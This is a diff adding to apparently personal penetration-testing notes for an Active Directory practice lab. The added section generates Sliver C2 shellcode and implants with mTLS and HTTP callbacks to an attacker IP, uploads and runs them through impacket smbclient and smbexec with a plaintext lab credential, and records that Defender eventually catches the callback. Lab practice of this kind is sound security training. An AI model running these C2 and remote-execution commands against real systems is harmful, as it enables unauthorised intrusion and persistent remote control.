@@ -188,6 +188,71 @@ impacket-smbexec north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22
 copy c:\inetpub\wwwroot\upload\8082.exe c:\windows\system32
 ```
 
+### Starting Sliver
+
+##### Create a profile
+```
+profiles new -mtls 192.168.56.230 --format shellcode sliver-win-shellcode
+```
+
+##### Create the listener
+```
+stage-listener --url http://192.168.56.230:8082 --profile sliver-win-shellcode
+```
+
+##### Verify Listener
+```
+jobs
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903161456.png)
+
+##### Generate Shellcode
+```
+generate stager --lhost 192.168.56.11 --lport 8082 --protocol http --save /home/kali/Desktop/sliver/win-stager-shellcode
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903161811.png)
+
+##### Generate a Payload
+```
+generate --os windows --arch 64bit --mtls 192.168.56.230 --save /home/kali/Desktop/sliver/
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903162447.png)
+
+##### Start the mtls listener
+```
+mtls
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903165424.png)
+
+### Upload Payload
+- The payload is too large to for the webserver to  handle
+
+##### Upload with impacket-smbclient
+```
+impacket-smbclient north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903164620.png)
+
+### Execute Payload
+
+##### impacket-smbexec
+```
+impacket-smbexec north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903165514.png)
+
+
+### Callback
+- gets caught by Defender..eventually
+
+### REDO!
+
+
+
+
+
+
+
 
 
 ### AS-REP Roast Attempt 2
